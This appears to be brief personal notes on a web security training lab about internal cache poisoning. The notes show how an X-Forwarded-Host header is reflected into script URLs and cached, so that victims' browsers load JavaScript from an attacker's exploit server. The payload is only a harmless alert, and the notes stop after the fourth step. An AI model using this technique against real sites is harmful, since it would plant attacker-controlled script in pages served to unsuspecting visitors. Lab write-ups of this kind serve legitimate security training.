# **Internal cache poisoning**

Task: This lab is vulnerable to web cache poisoning. It uses multiple layers of caching. A user regularly visits this site's home page using Chrome.

To solve the lab, poison the internal cache so that the home page executes `alert(document.cookie)` in the victim's browser.

Toolkit:BurpSuite, Browser

1. explore header params → x-forwarded-host  
2. see it reflects 2 times in resp

\<link rel="canonical" href='//exploit-0a1a002404ba408080e370ec01230065.exploit-server.net/?d=3'/\>  
        \<title\>Internal cache poisoning\</title\>  
    \</head\>  
\<\!--LAB\_HEAD\_END--\>  
    \<body\>  
        \<script type="text/javascript" src="//[exploit-0a1a002404ba408080e370ec01230065.exploit-server.net/resources/js/analytics.js](http://exploit-0a1a002404ba408080e370ec01230065.exploit-server.net/resources/js/analytics.js)"\>\</script\>  
AND THIRD APPEARS→ this is internal cache

       \<script src=//exploit-0a1a002404ba408080e370ec01230065.exploit-server.net/js/geolocate.js?callback=loadCountry\>\</script\>  
and it still reflects when x-forwarded-host is deleted

3. store js/[geolocate.js](http://geolocate.js) with body alert(2) on exploit server  
4. enter page with cache buster
